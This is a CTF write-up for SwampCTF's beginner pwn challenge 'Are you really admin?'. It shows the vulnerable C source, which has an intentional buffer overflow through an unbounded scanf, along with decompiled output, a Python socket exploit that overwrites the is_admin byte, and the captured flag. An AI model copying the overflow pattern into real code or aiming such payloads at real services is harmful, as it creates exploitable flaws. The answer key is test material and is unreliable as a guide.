[[Pwn]]

## Description

```
Beginner Pwn 1
Pwn
Worth 25 Points
```

Are you really admin?

This challenge serves as an introduction to pwn that new ctfers can use to grasp basic pwn concepts.

nc chals.swampctf.com 40004

It also had a download link to a 'is_admin' file and a 'main.c' file.

(main.c file)
```
#include <stdio.h>

#include <stdint.h>

#include <stdbool.h>

  

int print_stack(uint8_t *stack, uint32_t size){

    printf("--- Print Stack ---\n");

  

    while(size !=  -1) {

        printf("0x%02x (%c)", stack[size], stack[size]);

        if(size <= 9) {

            printf(" = username[%d]\n", size);

        } else if(size > 9 && size <= 13) {

            printf(" = is_admin[%d]\n", size - 10);

        } else {

            printf("\n");

        }

        size -= 1;

    }

    printf("--- End Print ---\n");

}

  

void print_flag(){

    FILE *fptr;

    char flag[35] = {0};

  

    fptr = fopen("flag.txt", "r");

    fread(flag, 1, 34, fptr);

    printf("Here is your flag! %s\n", flag);

    fclose(fptr);

}

  

int main(void) {

  

    bool is_admin = false;

    char username[10] = "XXXXXXXXXX"; // prefill buffer with X's

    char choice[2];

    printf("At it's most basic, a computer exploit is finding a loophole in a programs logic which can cause unintended behavior. In this program, we demonstrate how buffer overflows can corrupt local variables.\n\n");

    printf("To log into this system, please enter your name: ");

  

    scanf("%s", username);

    print_stack(&username, 13);

    printf("Hello, %s!\n", username);

  

    if(is_admin == true) {

        printf("%s is admin\n", username);

        printf("Because the program accepts more characters then it has space to hold, you are able to corrupt the is_admin boolean. And because in C, any Boolean value that isn't 0 is considered \"True\", it lets you through!\n");

    } else {

        printf("%s is not admin\n", username);

    }

    printf("Do you want to print the flag? (y/n) ");

    scanf("%1s", choice);

    if(choice[0] == 'y') {

        if(is_admin == false) {

            printf("You do not have the necessary access!\n");

            return 0;

        }

        print_flag();

    }

    printf("Exiting!\n");

    return 0;

}
```

(Didn't include the 'is_admin' file because I found it unnecessary when finding my solution, it is more useful when learning how to actually solve a pwn challenge)


## Solution

After looking through the main.c file, it was quite obvious that you have take advantage of buffer overflow in order to set yourself as the admin.

In this case after reading the code, you can clearly see where ```

```
bool is_admin = false;
char username[10] = "XXXXXXXXXX";
```

Note, you can also check the is_admin file with an interactive disassembler to see the following
```
v6 = 0;
  strcpy(v5, "XXXXXXXXXX");
  printf(
    "At it's most basic, a computer exploit is finding a loophole in a programs logic which can cause unintended behavior"
    ". In this program, we demonstrate how buffer overflows can corrupt local variables.\n"
    "\n");
  printf("To log into this system, please enter your name: ");
  __isoc99_scanf("%s", v5);
  print_stack(v5, 13LL);
  printf("Hello, %s!\n", v5);
  if ( (v5[10] & 1) == 1 )
  {
    printf("%s is admin\n", v5);
    printf(
      "Because the program accepts more characters then it has space to hold, you are able to corrupt the is_admin boolea"
      "n. And because in C, any Boolean value that isn't 0 is considered \"True\", it lets you through!\n");
  }
```
And in the stack of main you can see:
```
-000000000000000F     _BYTE var_F[11];
-0000000000000004     _DWORD var_4;
```
Which corresponds to v5 and v6 (username and is_admin)

And whether or not you read the is_admin file or not, it was clear that you needed to use a payload to fill username and an extra byte to set is_admin

I did this by creating a simple program that connected to the specific port (40004), and inputted the payload AAAAAAAAAA\x01 as shown below:

```

import socket

  

host = "chals.swampctf.com"

port = 40004

  

# 10 A's to fill username + 1 byte (0x01) to set is_admin

payload = b"A" * 10 + b"\x01"

  

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:

    s.connect((host, port))

    # Read initial prompt

    print(s.recv(1024).decode())

  

    # Send exploit payload

    s.sendall(payload + b"\n")

    # Read response (should confirm we are admin)

    print(s.recv(1024).decode())

  

    # Send 'y' to print the flag

    s.sendall(b"y\n")

  

    # Read final response (should contain flag)

    print(s.recv(1024).decode())
```

## Flag

After running this program, it gave the output with the correct flag:
swampCTF{n0t_@11_5t@ck5_gr0w_d0wn}